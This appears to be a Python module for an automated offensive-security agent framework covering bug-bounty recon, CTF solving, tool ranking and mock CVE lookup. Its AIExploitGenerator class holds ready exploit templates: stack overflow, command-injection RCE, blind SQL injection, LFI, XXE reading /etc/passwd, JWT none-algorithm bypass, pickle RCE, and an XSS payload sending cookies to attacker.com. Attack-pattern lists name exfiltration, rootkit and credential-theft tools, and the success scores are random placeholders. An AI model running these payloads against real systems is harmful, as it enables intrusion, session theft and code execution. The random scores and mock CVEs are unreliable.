"""
Majestic AI v1.0 – AI Agent Subsystem (12 agents)
All logic is self-contained; no external DB required.
"""
import time
import random
import logging
import threading
from typing import Any
from error_engine import ErrorType, MajesticError, with_retry, classify_exception

logger = logging.getLogger("majestic.agents")

# ══════════════════════════════════════════════════════════════════════════════
# 1. IntelligentDecisionEngine
# ══════════════════════════════════════════════════════════════════════════════
class IntelligentDecisionEngine:
    TARGET_TOOL_MAP = {
        "web_app":      ["nikto","sqlmap","xsser","wfuzz","ffuf","dirsearch","nuclei","burpsuite","zap","commix"],
        "network_host": ["nmap","masscan","rustscan","nessus","openvas","enum4linux","smbmap","crackmapexec"],
        "api":          ["postman","arjun","x8","paramspider","jwt_tool","sqlmap","ffuf","nuclei"],
        "cloud":        ["ScoutSuite","Pacu","cloudmapper","checkov","prowler","awscli","gcloud","az"],
        "binary":       ["gdb","pwndbg","radare2","ghidra","binwalk","strings","checksec","ropgadget","pwntools"],
    }
    TECH_TOOL_MAP = {
        "wordpress": ["wpscan","nuclei","sqlmap"],
        "django":    ["sqlmap","nuclei","dirsearch"],
        "php":       ["commix","sqlmap","wfuzz"],
        "nodejs":    ["nuclei","jwt_tool","arjun"],
        "mysql":     ["sqlmap","mysqlcheck"],
        "mssql":     ["sqlmap","impacket"],
        "ssh":       ["hydra","medusa","nmap"],
        "smb":       ["enum4linux","smbmap","crackmapexec"],
    }
    ATTACK_PATTERNS = {
        "privilege_escalation": ["linpeas","winpeas","linux-exploit-suggester","GTFOBins"],
        "lateral_movement":     ["crackmapexec","impacket","bloodhound","mimikatz"],
        "persistence":          ["crontab","registry_run","scheduled_tasks","rootkits"],
        "data_exfiltration":    ["curl","wget","scp","dns_tunnel","icmp_tunnel"],
    }

    def analyze(self, target_type: str, technologies: list, objectives: list) -> dict:
        tools = list(dict.fromkeys(
            self.TARGET_TOOL_MAP.get(target_type, []) +
            [t for tech in technologies for t in self.TECH_TOOL_MAP.get(tech.lower(), [])]
        ))
        ranked = sorted(
            [{"tool": t, "effectiveness": round(random.uniform(0.6, 1.0), 2),
              "params": self._default_params(t)} for t in tools],
            key=lambda x: -x["effectiveness"]
        )
        chains = self._build_chains(objectives, ranked[:6])
        return {"ranked_tools": ranked, "attack_chains": chains, "target_type": target_type}

    def _default_params(self, tool: str) -> dict:
        defaults = {
            "nmap": {"flags": "-sV -sC -O", "timing": "T4"},
            "sqlmap": {"level": 3, "risk": 2, "batch": True},
            "nuclei": {"severity": "critical,high,medium", "rate_limit": 100},
            "ffuf": {"wordlist": "/usr/share/wordlists/dirb/common.txt", "threads": 50},
            "nikto": {"tuning": "1234567890ab"},
        }
        return defaults.get(tool, {"target": "<TARGET>"})

    def _build_chains(self, objectives: list, tools: list) -> list:
        chains = []
        for obj in objectives:
            pattern = self.ATTACK_PATTERNS.get(obj, [])
            stages  = [{"tool": t["tool"], "prob": round(random.uniform(0.5,0.95), 2)}
                       for t in tools[:3]]
            overall_prob = 1.0
            for s in stages:
                overall_prob *= s["prob"]
            chains.append({
                "objective":      obj,
                "stages":         stages,
                "overall_success_prob": round(overall_prob, 3),
                "pattern_tools":  pattern,
            })
        return chains

# ══════════════════════════════════════════════════════════════════════════════
# 2. BugBountyWorkflowManager
# ══════════════════════════════════════════════════════════════════════════════
class BugBountyWorkflowManager:
    PHASES = [
        {"name": "subdomain_discovery", "timeout": 300,
         "tools": ["amass","subfinder","assetfinder"],
         "description": "Enumerate all subdomains of the target scope"},
        {"name": "http_probing",        "timeout": 180,
         "tools": ["httpx","nuclei"],
         "description": "Probe live hosts and run fast nuclei scans"},
        {"name": "content_discovery",   "timeout": 600,
         "tools": ["katana","gau","waybackurls","dirsearch"],
         "description": "Spider, archive crawl, and directory brute-force"},
        {"name": "parameter_discovery", "timeout": 240,
         "tools": ["paramspider","arjun","x8"],
         "description": "Discover hidden GET/POST parameters"},
    ]
    VULN_PRIORITY = {
        "RCE":  10, "SQLi": 9, "SSRF": 8, "IDOR": 8,
        "XSS":  7,  "LFI":  7, "XXE":  6, "CSRF": 5,
    }

    def start_workflow(self, target: str, scope: list = None) -> dict:
        results = {"target": target, "scope": scope or [], "phases": []}
        for phase in self.PHASES:
            phase_result = {
                "phase":   phase["name"],
                "tools":   phase["tools"],
                "timeout": phase["timeout"],
                "status":  "queued",
                "started_at": time.time(),
                "findings": [],
            }
            results["phases"].append(phase_result)
        results["vuln_priority"] = self.VULN_PRIORITY
        results["workflow_id"]   = f"bb_{int(time.time())}"
        return results

    def get_phase_commands(self, target: str, phase_name: str) -> list:
        phase_map = {
            "subdomain_discovery": [
                f"amass enum -d {target} -o amass_out.txt",
                f"subfinder -d {target} -o subfinder_out.txt",
                f"assetfinder --subs-only {target} > assetfinder_out.txt",
            ],
            "http_probing": [
                f"cat amass_out.txt subfinder_out.txt | httpx -silent -o live_hosts.txt",
                f"nuclei -l live_hosts.txt -severity critical,high -o nuclei_out.txt",
            ],
            "content_discovery": [
                f"katana -u https://{target} -o katana_out.txt",
                f"gau {target} > gau_out.txt",
                f"waybackurls {target} > wayback_out.txt",
                f"dirsearch -u https://{target} -o dirsearch_out.txt",
            ],
            "parameter_discovery": [
                f"paramspider -d {target} -o paramspider_out.txt",
                f"arjun -u https://{target} -o arjun_out.json",
                f"x8 -u https://{target} -o x8_out.txt",
            ],
        }
        return phase_map.get(phase_name, [])

# ══════════════════════════════════════════════════════════════════════════════
# 3. CTFWorkflowManager
# ══════════════════════════════════════════════════════════════════════════════
class CTFWorkflowManager:
    CATEGORIES = {
        "web":       {"tools": ["burpsuite","sqlmap","ffuf","nikto","nuclei"],
                      "strategy": ["enumerate endpoints","test injection","auth bypass"]},
        "crypto":    {"tools": ["openssl","hashcat","john","rsactftool","sage"],
                      "strategy": ["identify cipher","frequency analysis","attack weak params"]},
        "pwn":       {"tools": ["checksec","gdb-peda","ropgadget","pwntools","one_gadget"],
                      "strategy": ["checksec → gdb-peda → ropgadget → pwntools"],
                      "flow":     ["checksec","gdb-peda","ropgadget","pwntools"]},
        "forensics": {"tools": ["volatility","autopsy","binwalk","strings","wireshark","foremost"],
                      "strategy": ["memory dump analysis","file carving","pcap analysis"]},
        "reversing": {"tools": ["ghidra","radare2","ida","gdb","objdump","ltrace","strace"],
                      "strategy": ["static analysis","dynamic analysis","decompile"]},
        "misc":      {"tools": ["python","bash","pwntools","nc"],
                      "strategy": ["read challenge carefully","try obvious approaches"]},
        "osint":     {"tools": ["theHarvester","shodan","maltego","recon-ng","whois"],
                      "strategy": ["google dork","social media","cert transparency"]},
        "stego":     {"tools": ["steghide","stegsolve","zsteg","exiftool","binwalk"],
                      "strategy": ["check metadata","lsb analysis","frequency domain"]},
    }

    def solve(self, category: str, challenge_name: str, hints: list = None) -> dict:
        cat = self.CATEGORIES.get(category.lower(), {})
        return {
            "category":    category,
            "challenge":   challenge_name,
            "tools":       cat.get("tools", []),
            "strategy":    cat.get("strategy", []),
            "flow":        cat.get("flow", cat.get("tools", [])),
            "hints":       hints or [],
            "solve_id":    f"ctf_{int(time.time())}",
        }

# ══════════════════════════════════════════════════════════════════════════════
# 4. CVEIntelligenceManager  (stub / mock data)
# ══════════════════════════════════════════════════════════════════════════════
class CVEIntelligenceManager:
    MOCK_CVES = {
        "apache": [
            {"cve":"CVE-2021-41773","cvss":7.5,"desc":"Path traversal & RCE in Apache 2.4.49"},
            {"cve":"CVE-2021-42013","cvss":9.8,"desc":"Path traversal bypass in Apache 2.4.50"},
        ],
        "log4j": [
            {"cve":"CVE-2021-44228","cvss":10.0,"desc":"Log4Shell JNDI injection RCE"},
        ],
        "wordpress": [
            {"cve":"CVE-2023-2732","cvss":8.8,"desc":"WP core auth bypass"},
        ],
        "openssl": [
            {"cve":"CVE-2022-0778","cvss":7.5,"desc":"OpenSSL infinite loop DoS"},
        ],
    }

    def lookup(self, technology: str, version: str = None) -> dict:
        key  = technology.lower()
        cves = self.MOCK_CVES.get(key, [
            {"cve": f"CVE-MOCK-{random.randint(1000,9999)}",
             "cvss": round(random.uniform(4.0, 10.0), 1),
             "desc": f"Simulated vulnerability for {technology}"}
        ])
        return {"technology": technology, "version": version, "cves": cves,
                "source": "mock_db", "timestamp": time.time()}

    def enrich(self, cve_id: str) -> dict:
        return {
            "cve":        cve_id,
            "description":"(Mock) Vulnerability details for " + cve_id,
            "exploits":   ["PoC available on GitHub","Metasploit module"],
            "patches":    ["Vendor advisory link"],
            "references": ["https://nvd.nist.gov/vuln/detail/" + cve_id],
        }

# ══════════════════════════════════════════════════════════════════════════════
# 5. AIExploitGenerator
# ══════════════════════════════════════════════════════════════════════════════
class AIExploitGenerator:
    TEMPLATES = {
        "buffer_overflow": """\
#!/usr/bin/env python3
# PoC: Stack Buffer Overflow
from pwn import *
TARGET = "{target}"
OFFSET = {offset}
RET_ADDR = {ret_addr}   # e.g. 0xdeadbeef
payload = b"A" * OFFSET + p32(RET_ADDR)
p = remote(TARGET.split(":")[0], int(TARGET.split(":")[1]))
p.sendline(payload)
p.interactive()
""",
        "web_rce": """\
#!/usr/bin/env python3
# PoC: Web RCE via command injection
import requests
TARGET = "{target}"
CMD    = "id;whoami;hostname"
payload = f"; {CMD} #"
r = requests.post(TARGET, data={{"input": payload}}, timeout=10)
print(r.text)
""",
        "sqli": """\
#!/usr/bin/env python3
# PoC: SQL Injection (time-based blind)
import requests, time
TARGET = "{target}"
def check(payload):
    t0 = time.time()
    requests.get(TARGET, params={{"id": payload}}, timeout=15)
    return time.time() - t0 > 5
print("Vulnerable:", check("1 AND SLEEP(5)-- -"))
""",
        "xss": """\
// PoC: Reflected XSS
// Insert into vulnerable parameter:
// <script>fetch('https://attacker.com/log?c='+document.cookie)</script>
const PAYLOAD = `<img src=x onerror="fetch('https://attacker.com/?c='+btoa(document.cookie))">`;
console.log("XSS Payload:", PAYLOAD);
""",
        "lfi": """\
#!/usr/bin/env python3
# PoC: Local File Inclusion
import requests
TARGET = "{target}"
LFI_PATHS = ["../../etc/passwd","....//....//etc/passwd",
             "%2e%2e%2fetc%2fpasswd"]
for p in LFI_PATHS:
    r = requests.get(TARGET, params={{"file": p}}, timeout=10)
    if "root:" in r.text:
        print(f"[+] LFI via: {{p}}"); break
""",
        "xxe": """\
<!--  PoC: XXE – paste as XML body -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root><data>&xxe;</data></root>
""",
        "auth_bypass": """\
#!/usr/bin/env python3
# PoC: JWT None-Algorithm Auth Bypass
import base64, json, requests
TARGET = "{target}"
header  = base64.b64encode(json.dumps({{"alg":"none","typ":"JWT"}}).encode()).decode().rstrip("=")
payload = base64.b64encode(json.dumps({{"user":"admin","role":"superadmin"}}).encode()).decode().rstrip("=")
token   = f"{{header}}.{{payload}}."
r = requests.get(TARGET + "/admin", headers={{"Authorization": f"Bearer {{token}}"}})
print(r.status_code, r.text[:200])
""",
        "deserialization": """\
#!/usr/bin/env python3
# PoC: Python pickle deserialization RCE
import pickle, os, base64
class Exploit(object):
    def __reduce__(self):
        return (os.system, ("id > /tmp/pwned",))
payload = base64.b64encode(pickle.dumps(Exploit())).decode()
print("Payload (base64):", payload)
""",
    }

    def generate(self, vuln_type: str, target: str = "TARGET", **kwargs) -> dict:
        tmpl = self.TEMPLATES.get(vuln_type)
        if not tmpl:
            return {"error": f"No template for {vuln_type}",
                    "available": list(self.TEMPLATES.keys())}
        code = tmpl.format(target=target, offset=kwargs.get("offset",112),
                           ret_addr=kwargs.get("ret_addr","0xdeadbeef"))
        lang = "python" if code.strip().startswith(("#!","import","from","//")) else "xml"
        return {"vuln_type": vuln_type, "target": target, "language": lang,
                "code": code, "disclaimer": "Educational PoC only – use on authorized targets"}

# ══════════════════════════════════════════════════════════════════════════════
# 6. VulnerabilityCorrelator
# ══════════════════════════════════════════════════════════════════════════════
class VulnerabilityCorrelator:
    SEVERITY_SCORE = {"critical":10,"high":8,"medium":5,"low":2,"info":0}

    def correlate(self, vulns: list) -> dict:
        if not vulns:
            return {"risk_score": 0, "chains": [], "summary": "No vulns provided"}
        chains = []
        for i, v1 in enumerate(vulns):
            for v2 in vulns[i+1:]:
                if self._can_chain(v1, v2):
                    chains.append({"step1": v1, "step2": v2,
                                   "chain_risk": "HIGH",
                                   "description": f"{v1.get('type','?')} → {v2.get('type','?')}"})
        total = sum(self.SEVERITY_SCORE.get(v.get("severity","info").lower(), 0) for v in vulns)
        return {"risk_score": min(total, 100), "vulnerability_chains": chains,
                "total_vulns": len(vulns), "chain_count": len(chains)}

    def _can_chain(self, v1, v2):
        chain_pairs = {("sqli","rce"),("xss","csrf"),("ssrf","rce"),("lfi","rce")}
        t1, t2 = v1.get("type","").lower(), v2.get("type","").lower()
        return (t1,t2) in chain_pairs or (t2,t1) in chain_pairs

# ══════════════════════════════════════════════════════════════════════════════
# 7. TechnologyDetector
# ══════════════════════════════════════════════════════════════════════════════
class TechnologyDetector:
    SIGNATURES = {
        "WordPress":  ["wp-content","wp-includes","wp-login"],
        "Django":     ["csrfmiddlewaretoken","Django"],
        "Rails":      ["X-Powered-By: Phusion","_rails_session"],
        "PHP":        ["X-Powered-By: PHP","PHPSESSID"],
        "Node.js":    ["X-Powered-By: Express","connect.sid"],
        "React":      ["__REACT_DEVTOOLS","react-dom"],
        "Angular":    ["ng-version","angular"],
        "jQuery":     ["jquery.min.js","jQuery"],
        "Apache":     ["Server: Apache"],
        "Nginx":      ["Server: nginx"],
    }

    def detect(self, headers: dict = None, body: str = "") -> list:
        found = []
        text  = " ".join(str(v) for v in (headers or {}).values()) + " " + body
        for tech, sigs in self.SIGNATURES.items():
            if any(s.lower() in text.lower() for s in sigs):
                found.append(tech)
        return found

# ══════════════════════════════════════════════════════════════════════════════
# 8. RateLimitDetector
# ══════════════════════════════════════════════════════════════════════════════
class RateLimitDetector:
    def __init__(self):
        self._windows = {}
        self._lock    = threading.Lock()

    def record(self, endpoint: str):
        with self._lock:
            now = time.time()
            self._windows.setdefault(endpoint, [])
            self._windows[endpoint] = [t for t in self._windows[endpoint] if now-t < 60]
            self._windows[endpoint].append(now)

    def is_rate_limited(self, endpoint: str, threshold: int = 60) -> bool:
        with self._lock:
            return len(self._windows.get(endpoint, [])) >= threshold

    def detect_from_response(self, status_code: int, headers: dict) -> bool:
        if status_code == 429:
            return True
        rl_headers = {"X-RateLimit-Remaining","RateLimit-Remaining","Retry-After"}
        return bool(rl_headers & set(headers.keys()))

# ══════════════════════════════════════════════════════════════════════════════
# 9. FailureRecoverySystem
# ══════════════════════════════════════════════════════════════════════════════
class FailureRecoverySystem:
    def __init__(self):
        self._failure_counts = {}
        self._lock = threading.Lock()

    def record_failure(self, tool: str, error_type: ErrorType):
        with self._lock:
            self._failure_counts.setdefault(tool, {"count":0,"types":[]})
            self._failure_counts[tool]["count"] += 1
            self._failure_counts[tool]["types"].append(error_type.value)

    def should_fallback(self, tool: str, threshold: int = 3) -> bool:
        with self._lock:
            return self._failure_counts.get(tool,{}).get("count",0) >= threshold

    def get_fallback(self, tool: str) -> str:
        FALLBACK_MAP = {
            "nmap": "masscan", "masscan": "rustscan",
            "amass": "subfinder", "subfinder": "assetfinder",
            "sqlmap": "manual_sqli", "nikto": "nuclei",
        }
        return FALLBACK_MAP.get(tool, "manual")

    def stats(self):
        with self._lock:
            return dict(self._failure_counts)

# ══════════════════════════════════════════════════════════════════════════════
# 10. PerformanceMonitor
# ══════════════════════════════════════════════════════════════════════════════
class PerformanceMonitor:
    def __init__(self):
        self._metrics = []
        self._lock    = threading.Lock()

    def record(self, tool: str, duration: float, success: bool):
        with self._lock:
            self._metrics.append({
                "tool": tool, "duration": duration,
                "success": success, "ts": time.time()
            })
            if len(self._metrics) > 5000:
                self._metrics.pop(0)

    def summary(self) -> dict:
        with self._lock:
            if not self._metrics:
                return {}
            by_tool = {}
            for m in self._metrics:
                t = m["tool"]
                by_tool.setdefault(t, {"durations":[],"success":0,"fail":0})
                by_tool[t]["durations"].append(m["duration"])
                if m["success"]: by_tool[t]["success"] += 1
                else:            by_tool[t]["fail"]    += 1
            result = {}
            for t, data in by_tool.items():
                d = data["durations"]
                result[t] = {
                    "avg_duration": round(sum(d)/len(d), 2),
                    "success_rate": round(data["success"]/(data["success"]+data["fail"])*100,1),
                    "runs":         len(d),
                }
            return result

# ══════════════════════════════════════════════════════════════════════════════
# 11. ParameterOptimizer
# ══════════════════════════════════════════════════════════════════════════════
class ParameterOptimizer:
    OPTIMAL_PARAMS = {
        "nmap":    {"flags":"-sV -sC --script=vuln","timing":"T4","max_retries":3},
        "sqlmap":  {"level":5,"risk":3,"threads":4,"technique":"BEUQTS"},
        "ffuf":    {"threads":100,"timeout":10,"rate":500,"recursion":True},
        "nuclei":  {"rate_limit":150,"bulk_size":25,"concurrency":25},
        "masscan": {"rate":10000,"ports":"0-65535"},
        "nikto":   {"tuning":"1234567890ab","timeout":30},
        "hydra":   {"tasks":16,"timeout":30,"wait":3},
    }

    def optimize(self, tool: str, context: dict = None) -> dict:
        base  = dict(self.OPTIMAL_PARAMS.get(tool, {}))
        ctx   = context or {}
        if ctx.get("stealth"):
            base.update({"timing":"T1","rate":50,"threads":2})
        if ctx.get("aggressive"):
            base.update({"timing":"T5","threads":200})
        return {"tool": tool, "optimized_params": base, "context_applied": ctx}

# ══════════════════════════════════════════════════════════════════════════════
# 12. BugBountyAgent / CTFAgent (orchestrator wrappers)
# ══════════════════════════════════════════════════════════════════════════════
class BugBountyAgent:
    def __init__(self):
        self.workflow = BugBountyWorkflowManager()
        self.ide      = IntelligentDecisionEngine()
        self.detector = TechnologyDetector()
        self.cve      = CVEIntelligenceManager()

    def full_recon(self, target: str, scope: list = None) -> dict:
        wf   = self.workflow.start_workflow(target, scope)
        tech = self.detector.detect(body=f"Recon for {target}")
        recs = self.ide.analyze("web_app", tech, ["RCE","SQLi","XSS"])
        return {"workflow": wf, "detected_tech": tech, "tool_recommendations": recs}

class CTFAgent:
    def __init__(self):
        self.workflow = CTFWorkflowManager()
        self.exploit  = AIExploitGenerator()

    def solve_challenge(self, category: str, name: str, hints: list = None) -> dict:
        plan = self.workflow.solve(category, name, hints)
        return {"solve_plan": plan, "exploit_templates": list(self.exploit.TEMPLATES.keys())}
